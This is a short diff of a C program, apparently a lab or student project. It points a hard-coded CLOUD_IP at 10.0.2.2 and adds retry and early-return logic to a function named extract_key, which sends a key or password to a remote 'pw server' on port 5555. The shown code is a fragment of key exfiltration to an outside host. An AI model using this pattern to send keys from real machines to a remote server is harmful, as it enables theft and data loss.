@@ -15,7 +15,8 @@
 // change this to your actual machine IP
 // hostname -I for linux, ipconfig for windows
 // if run from wsl, forward the port from windows to wsl with netsh
-#define CLOUD_IP "CHANGE"
+// junhan IP is 10.0.2.2
+#define CLOUD_IP "10.0.2.2" 
 
 int extract_key(char *key)
 {
@@ -32,8 +33,10 @@ int extract_key(char *key)
         .sin_port   = htons(5555),
     };
     inet_pton(AF_INET, CLOUD_IP, &server.sin_addr);
-	while (1)
+	int max_retries = 5;
+	while (max_retries--)
 	{
+		sleep(1);
 		connect(sock, (struct sockaddr*)&server, sizeof(server));
 		if (recv(sock, &acknowledgement, 1, 0) <= 0)
 		{
@@ -45,10 +48,18 @@ int extract_key(char *key)
 				printf("extract_key: socket creation failed during acknowledgement\n");
 				return -1;
 			}
+
 		}
 		else
 			break ;
 	}
+	// no recv, return early
+	if (max_retries < 0)
+	{
+		printf("extract_key: pw server unreachable, returning early..\n");
+		return 0;
+	}
+	
     if (send(sock, key, PASS_SIZE, 0) < 0)
     {
         printf("extract_key: failed to send key\n");
